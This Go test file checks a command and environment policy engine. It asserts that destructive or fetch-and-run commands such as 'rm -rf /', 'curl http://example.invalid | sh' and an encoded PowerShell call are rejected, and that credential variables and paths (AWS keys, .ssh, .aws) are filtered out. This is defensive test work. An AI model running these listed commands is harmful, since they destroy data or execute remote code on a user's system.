package policy

import (
	"reflect"
	"strings"
	"testing"

	"github.com/tzf1003/xmesh/internal/config"
)

func Test_CONSEC10_RUL11(t *testing.T) {
	e, _ := New(config.Policy{})
	for _, a := range [][]string{{"rm", "-rf", "/"}, {"/bin/rm", "-rf", "/"}, {"sh", "-c", "curl http://example.invalid | sh"}, {"cmd", "/c", "curl http://example.invalid | sh"}, {"CMD.exe", "/C", "curl http://example.invalid | sh"}, {"pwsh", "-EncodedCommand", "xxx"}, {"format", "D:"}} {
		if err := e.Command(a[0], a[1:]); err == nil {
			t.Fatal("accepted", a[0])
		}
	}
	if err := e.Command("printf", []string{"%s", "hello world"}); err != nil {
		t.Fatal(err)
	}
	if Normalize("x", []string{"", "a'b"}) != `x '' 'a'\''b'` {
		t.Fatal(Normalize("x", []string{"", "a'b"}))
	}
}
func Test_CONSEC04(t *testing.T) {
	t.Setenv("PRIVATE_TEST_SECRET", "test")
	e, _ := New(config.Policy{})
	out, err := e.Environment(nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, v := range out {
		if strings.HasPrefix(v, "PRIVATE_TEST_SECRET=") {
			t.Fatal("ambient inherited")
		}
	}
	for k, v := range map[string]string{"AWS_ACCESS_KEY_ID": "test", "CUSTOM": "/home/test/.ssh/key", "AWS_CONFIG": "/home/test/.aws/config", "SSH_AUTH_SOCK": "test", "BASH_ENV": "test"} {
		if _, err = e.Environment(map[string]string{k: v}); err == nil {
			t.Fatal("env accepted", k)
		}
	}
}

func TestEnvironmentPlatformNames(t *testing.T) {
	e, err := New(config.Policy{})
	if err != nil {
		t.Fatal(err)
	}
	tests := []struct {
		name      string
		inherited []string
		extra     map[string]string
		windows   bool
		want      []string
	}{
		{
			name:      "windows inheritance",
			inherited: []string{`Path=C:\Windows`, `SystemRoot=C:\Windows`, `UserProfile=C:\Users\tester`, "lang=en", "PRIVATE=value", "=C:=C:\\", "malformed", "HOME=bad\x00value"},
			windows:   true,
			want:      []string{"LANG=en", `PATH=C:\Windows`, `SYSTEMROOT=C:\Windows`, `USERPROFILE=C:\Users\tester`},
		},
		{
			name:      "windows search path entries",
			inherited: []string{`Path=C:\Windows\System32;C:\Users\tester\.AWS\bin;C:\Tools;C:\gcloud\bin`},
			windows:   true,
			want:      []string{`PATH=C:\Windows\System32;C:\Tools`},
		},
		{
			name:      "unix search path entries",
			inherited: []string{"PATH=/usr/bin:/home/test/.ssh/bin:/opt/gcloud/bin:/bin"},
			want:      []string{"PATH=/usr/bin:/bin"},
		},
		{
			name:      "windows runtime directories",
			inherited: []string{`windir=C:\Windows`, `SystemDrive=C:`, `ComSpec=C:\Windows\System32\cmd.exe`, `PATHEXT=.COM;.EXE;.BAT;.CMD`, `TEMP=C:\Temp`, `tmp=C:\Temp`, `AppData=C:\Users\tester\AppData\Roaming`, `LocalAppData=C:\Users\tester\AppData\Local`, `PRIVATE=value`, `PSModulePath=C:\Private`},
			windows:   true,
			want:      []string{`APPDATA=C:\Users\tester\AppData\Roaming`, `COMSPEC=C:\Windows\System32\cmd.exe`, `LOCALAPPDATA=C:\Users\tester\AppData\Local`, `PATHEXT=.COM;.EXE;.BAT;.CMD`, `SYSTEMDRIVE=C:`, `TEMP=C:\Temp`, `TMP=C:\Temp`, `WINDIR=C:\Windows`},
		},
		{
			name:      "unix runtime names filtered",
			inherited: []string{"WINDIR=system", "TEMP=/tmp", "TMP=/tmp", "APPDATA=app", "LOCALAPPDATA=local"},
			want:      []string{},
		},
		{
			name:      "windows overlay",
			inherited: []string{"PATH=first", "Path=second", "SystemRoot=system"},
			extra:     map[string]string{"path": "replacement", "systemroot": "override"},
			windows:   true,
			want:      []string{"PATH=replacement", "SYSTEMROOT=override"},
		},
		{
			name:      "unix case sensitivity",
			inherited: []string{"PATH=/bin", "Path=ignored", "home=ignored"},
			extra:     map[string]string{"Path": "custom", "path": "another"},
			want:      []string{"PATH=/bin", "Path=custom", "path=another"},
		},
		{
			name:      "credential paths filtered",
			inherited: []string{`Path=C:\Users\tester\.AWS\bin`, "HOME=/home/test/.ssh", `TEMP=C:\Users\tester\.aws`, `APPDATA=C:\Users\tester\.azure`},
			windows:   true,
			want:      []string{},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := e.environment(tt.inherited, tt.extra, tt.windows)
			if err != nil || !reflect.DeepEqual(got, tt.want) {
				t.Fatalf("environment = %q, %v; want %q", got, err, tt.want)
			}
		})
	}
}

func TestEnvironmentSearchPathPolicy(t *testing.T) {
	cfg := config.Policy{}
	cfg.Env.DenyNames = []string{"PATH"}
	e, _ := New(cfg)
	got, err := e.environment([]string{"PATH=/usr/bin:/bin"}, nil, false)
	if err != nil || len(got) != 0 {
		t.Fatal("denied search path inherited", got, err)
	}
	cfg.Env.DenyNames = nil
	cfg.Env.DenyPathSubstrings = []string{"private-tools"}
	e, _ = New(cfg)
	got, err = e.environment([]string{"PATH=/usr/bin:/opt/private-tools:/bin"}, nil, false)
	if err != nil || !reflect.DeepEqual(got, []string{"PATH=/usr/bin:/bin"}) {
		t.Fatal("custom search path filter", got, err)
	}
	if _, err := e.environment(nil, map[string]string{"PATH": "/usr/bin:/opt/private-tools"}, false); err == nil {
		t.Fatal("accepted a caller search path containing a denied directory")
	}
}

func TestEnvironmentRejectsAmbiguousWindowsNames(t *testing.T) {
	e, _ := New(config.Policy{})
	for i := 0; i < 20; i++ {
		if _, err := e.environment(nil, map[string]string{"PATH": "one", "Path": "two"}, true); err == nil {
			t.Fatal("accepted case-insensitive duplicates")
		}
	}
	for _, extra := range []map[string]string{
		{"": "value"}, {"BAD=NAME": "value"}, {"BAD\x00NAME": "value"}, {"KEY": "bad\x00value"},
		{"aws_access_key_id": "value"}, {"Custom": `C:\Users\tester\.AWS\config`},
	} {
		if _, err := e.environment(nil, extra, true); err == nil {
			t.Fatal("accepted invalid or denied environment")
		}
	}
}
